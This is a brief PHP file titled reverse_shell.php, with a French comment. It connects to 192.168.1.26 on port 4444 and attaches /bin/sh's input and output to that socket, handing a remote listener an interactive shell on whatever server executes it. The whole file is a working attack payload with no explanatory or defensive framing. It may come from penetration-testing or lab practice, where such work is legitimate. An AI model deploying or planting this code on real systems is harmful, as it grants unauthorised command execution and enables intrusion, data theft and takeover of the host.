<?php
// reverse_shell.php

$ip = '192.168.1.26';
$port = 4444; // Port à écouter

$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>